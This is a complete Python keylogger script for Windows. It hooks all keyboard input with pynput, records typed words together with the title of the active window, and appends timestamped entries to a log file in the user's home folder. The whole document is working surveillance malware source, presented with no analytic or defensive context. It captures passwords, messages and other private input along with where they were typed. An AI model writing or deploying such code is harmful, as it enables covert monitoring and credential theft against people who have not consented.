from pynput import keyboard
import time
import os
import win32gui

log_dir = os.path.expanduser('~')
log_file = os.path.join(log_dir, 'keystrokes_log.txt')
current_word = ""
current_window = ""

def get_active_window_title():
    return win32gui.GetWindowText(win32gui.GetForegroundWindow())

def on_key_press(key):
    global current_word, current_window

    try:
        if hasattr(key, 'char'):
            current_word += key.char
        elif key == keyboard.Key.space:
            save_current_word()
            current_word += ' '
        elif key == keyboard.Key.enter:
            save_current_word()
            current_word += ' [ENTER] '
    except AttributeError:
        pass

    current_window = get_active_window_title()

def save_current_word():
    global current_word, current_window

    if current_word:
        try:
            with open(log_file, 'a') as f:
                f.write(f'{time.strftime("%Y-%m-%d %H:%M:%S")} - [{current_window}] {current_word}\n')
            current_word = ""
        except Exception as e:
            print("Error writing to file:", e)

def main():
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

if __name__ == '__main__':
    main()
